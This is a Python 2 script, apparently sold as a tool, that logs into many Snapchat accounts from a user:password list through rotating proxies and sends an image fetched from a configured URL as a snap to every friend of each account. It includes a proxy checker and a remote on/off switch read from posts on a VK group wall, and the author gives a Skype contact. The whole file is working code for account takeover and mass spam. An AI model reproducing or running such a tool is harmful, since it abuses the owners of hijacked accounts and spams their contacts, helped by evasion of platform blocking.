import urllib2, urllib, socket, requests, json
from snapi import Snapchat
from datetime import datetime

inputData = []
inputProxies = []
imagename = ""
threads = ""

result = {}

full = 0

def main():
    t = datetime.now()
    # check everything first
    sts = checkStates() 
    if sts == 0:
        print "Fatal error. Contact me on skype 'volkvid'"
        raw_input()
        exit()
    elif sts == 1:
        # everything is ok
        prepair()
        oneThread()

        print "\nlen = ", len(result)
        for acc in result:
            print acc + " " + result[acc]

        print "\n\ntime =", datetime.now() - t
        print "\nfull num = ", full


def oneThread():
    global full
    print "used proxies:"
    i = 0 
    for proxy in inputProxies:
        if not is_bad_proxy(proxy):
            print "+ " + proxy #only for UI
            for auth in inputData:
                s = auth["user"]+":"+auth["pass"]

                if s not in result:
                    num = process(proxy, auth)
                    if num == 0:
                        result[s] = "#error"
                    else:
                        result[s] = "#" + str(num)
                        full += num
        else:
            print "- " + proxy #only for UI

        if len(inputData) == len(result):
            break

        #---for early tests, proxy num
        i += 1
        if i > 20:
            break
        #---for early tests


# start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
def process(prox, auth):
    #global result
    #print "user "+auth["user"]+" pass "+auth["pass"]
    num = 0 #num of successfully processed snaps 
    prox = {"http": "http://"+prox, "https": "https://"+prox}

    try:
        s = Snapchat()
        s.proxies = prox
        login = s.login(auth["user"], auth["pass"])
        
        # get friends
        num = len(login["friends"])
        recipients = ""
        for friend in login["friends"]:
            recipients += friend["name"] + ","

        if len(recipients) > 1:
            recipients = recipients[:-1] #delete last ","
        else:
            return 0 # because no friends 

        # upload pic for curr account
        media_id = s.upload(imagename)
        # send snap to all
        done = s.send(media_id, recipients, time = 10)
        if done:
            return num
        else:
            return 0
        
    except Exception as ex:
        #print str(ex)
        return 0


def prepair():
    # IO here, updating all globals and starting threads!
    global imagename, threads, inputData, inputProxies
    try:
        proxiesFile = open("proxies.txt", "r")
        data = proxiesFile.read()
        proxiesFile.close()
        
        if data.find("\r\n") != -1:
            inputProxies = data.split("\r\n")
        else:
            inputProxies = data.split("\n")        
    except BaseException as ex:
        print "No file named 'proxies.txt', error " + str(ex)
        print "\nPress any key to exit"
        raw_input()
        exit()

    try:
        inputFile = open("input.txt", "r")
        data = inputFile.read()
        inputFile.close()
        # because win/mac
        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
            
        for item in data:
            item = item.split(":")
            inputData.append({
                "user":item[0].replace("\n", "").replace("\r\n", ""), 
                "pass":item[1].replace("\n", "").replace("\r\n", "")
                }) 
    except BaseException as ex:
        print "No file named 'input.txt', error " + str(ex)
        print "\nPress any key to exit"
        raw_input()
        exit()

    image = ""
    threads = ""
    try:
        settingsFile = open("settings.txt", "r")
        data = settingsFile.read()
        settingsFile.close()

        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
    
        for item in data:
            if item.find("image:") != -1:
                image = item.replace(" ", "")
            if item.find("threads:") != -1:
                threads = item.replace(" ", "")
        image = image.split("image:")[1]
        threads = int(threads.split("threads:")[1]) 
    except BaseException as ex:
        print "No file named 'settings.txt', error " + str(ex)
        print "\nPress any key to exit"
        raw_input()
        exit()

    form = image.split("/")
    form = form[len(form)-1].split(".")[1]
    imagename = "file." + form
    urllib.urlretrieve(image, filename=imagename)
    print "image is ready for upload"


def is_bad_proxy(pip):
    socket.setdefaulttimeout(7)
    try:        
        proxy_handler = urllib2.ProxyHandler({'http': pip})        
        opener = urllib2.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib2.install_opener(opener)        
        req=urllib2.Request('http://www.google.com')
        sock=urllib2.urlopen(req)
    except urllib2.HTTPError, e:        
        return True 
    except Exception, detail:
        return True
    return False


def checkStates():
    url = "https://api.vk.com/method/wall.get"
    params = {"owner_id": "-79888882", "count": "100", "offset": "0", "v": "5.26"}
    r = requests.post(url, params = params)
    r = json.loads(r.text)
    # check if exists
    pid = -1
    for item in r['response']['items']:
        if item['text'] == 'snapchat controll': #code1
            pid = item['id']

    if pid == -1:
        return 0
    else:
        url = "https://api.vk.com/method/wall.getComments"
        params = { "owner_id": "-79888882", "post_id": pid,
                   "count": "1", "offset": "0", "v": "5.26"}
        r = requests.post(url, params = params)
        r = json.loads(r.text)
        # only first code is checked
        try:
            r = r['response']['items'][0]
            if r['text'] == 'isok' and r['from_id'] == -79888882: #code2
                return 1
            else:
                return 0
        except:
            return 0
    

main()
